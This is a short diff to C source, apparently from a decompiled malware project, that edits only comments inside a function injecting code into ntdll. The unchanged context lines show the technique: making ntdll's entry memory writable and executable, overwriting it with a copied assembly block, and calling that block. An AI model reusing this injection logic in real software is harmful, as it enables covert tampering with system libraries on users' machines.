@@ -223,7 +223,7 @@ INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, P
 	hHandleNTDLL = pHardAddrs->NTDLL_DLL;
 	if(!pHardAddrs->NTDLL_DLL) return 0;
 
-	NTDLL_Entry = (void *)(hHandleNTDLL + 16); // Presumably the entry point
+	NTDLL_Entry = (void *)(hHandleNTDLL + 16);
 	if(*(_DWORD *)(hHandleNTDLL + 16) == 0xAB49103B) return 0; // Check if the code has been already injected
 
 	if(pHardAddrs->VirtualProtect(hHandleNTDLL, 0x1000, PAGE_EXECUTE_WRITECOPY, &dwOld))
@@ -231,7 +231,7 @@ INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, P
 		// Copy code into ntdll entry point...
 		BLOCK4_memcpy(NTDLL_Entry, (const void *)sASMCodeBlocksHeader->ASMBlock0Segment.SegmentAddress, sASMCodeBlocksHeader->ASMBlock0Segment.SegmentSize);
 
-		// ...then call __ASM_BLOCK1_0 with a pointer to the entry point as ECX because __thiscall
+		// ...then call __ASM_BLOCK1_0 with a pointer to the entry point as ECX( because __thiscall )
 		((void (__thiscall *)(void *))sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress)(NTDLL_Entry); // __thiscall ignored by compiler
 		pHardAddrs->FlushInstructionCache((HANDLE)-1, NULL, 0);
 
